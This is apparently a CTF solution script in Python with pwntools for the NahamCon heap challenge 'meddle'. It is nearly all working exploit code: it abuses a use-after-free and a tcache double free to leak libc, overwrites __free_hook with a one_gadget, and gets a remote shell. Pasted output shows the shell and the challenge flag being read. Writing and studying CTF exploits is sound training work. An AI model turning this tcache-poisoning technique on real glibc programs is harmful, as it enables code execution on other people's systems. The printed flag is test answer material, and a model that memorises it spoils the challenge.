from pwn import *

p = remote("challenge.nahamcon.com", 30776)
#p = process("./meddle", env={"LD_PRELOAD":"./meddle_libc.so.6"})
libc = ELF("meddle_libc.so.6")
def add(album, artist):
	p.sendlineafter("> ", "1")
	p.sendlineafter(": ", album)
	p.sendlineafter(": ", artist)

def show(idx):
	p.sendlineafter("> ", "2")
	p.sendlineafter("? ", str(idx))


def delete(idx):
	p.sendlineafter("> ", "4")
	p.sendlineafter("? ", str(idx))

def rate(idx, number):
	p.sendlineafter("> ", "3")
	p.sendlineafter("? ", str(idx))
	p.sendlineafter("? ", str(number))

'''
This one has Use After Free vulnerability in
the view and delete function, which mean we could delete the 
chunks twice or as many times as you could want.

and provided LIBC didn't had double free check for tcache bins
That being said, fill the tcache bins and get the chunk to
unsorted bin and leak the main_arena address and get the LIBC
base address, that being said, double free the tcache chunk, 
overwrite the fd with the __free_hook and then overwrite it
with the one_gadget
'''


# Allocate 9 chunks, 7 of them being in tcache
# 3 of them being in unsorted bin

for i in range(9):
	add("A"*80, "B"*48)

# Fill the tcache bins of size 0x90
for i in range(7):
	delete(i)

# Chunk 7th will go to the unsorted bin
delete(7)
# Get the main_arena address
show(7)

'''
Also, the first 4 bytes of the chunk will be
occupied with the ratings, so considering that, 
during leak or overwrite we have to carefully do
the work for it.
'''

# Leak LIBC and parse the valuye from name and ratinggs carefully
p.recvuntil(": ")
leak = hex(u16(p.recv(2).ljust(2, b"\x00")))
log.info("LEAK 1st:   %s" %(leak))
p.recvline()
p.recvline()
p.recvuntil("ratings: ")
leak += "%x" % (int(p.recvline().strip()))
log.info("LEAK:       %s" %(leak))
libc.address = int(leak.replace("-", ""), 16) - 0x3ebca0
log.info("LIBC:       0x%x" %libc.address)


target = libc.symbols['__free_hook']

# Now, add 5 more chunks to the tcache
for i in range(5):
	add("A"*8, "B"*4)

# Double free the 12th index chunk - count = 13
delete(12)
delete(12)

# Overwrite the fd of the 12th chunk with the 
# __free_hooj
add(p32(target >> 32), "bbb")
rate(12, target & 0xffffffff)

# Get the 12th chunk pointer
add("xxx", "xxx")    # count = 15
one_gadget = libc.address + 0x4f322

# Now, overwrite the __free_hook with the one_gadget
add(p32(one_gadget >> 32), "bbb")
rate(16, one_gadget & 0xffffffff)

'''
vagrant@ubuntu-bionic:~/sharedFolder/CTFs/NahamCon/pwn$ python3 meedle.py 
[+] Opening connection to challenge.nahamcon.com on port 30776: Done
[*] '/home/vagrant/sharedFolder/CTFs/NahamCon/pwn/meddle_libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] LEAK 1st:   0x7f6c
[*] LEAK:       0x7f6c10aefca0
[*] LIBC:       0x7f6c10704000
[*] Switching to interactive mode

1. add an album
2. view an album
3. rate an album
4. delete an album
5. exit
> $ 5
$ ls
bin
dev
etc
flag.txt
lib
lib64
meddle
usr
$ cat flag.txt
flag{877bea36ee5cb09f6ee959de2c6ac678}
$ 
[*] Interrupted
'''
p.interactive()
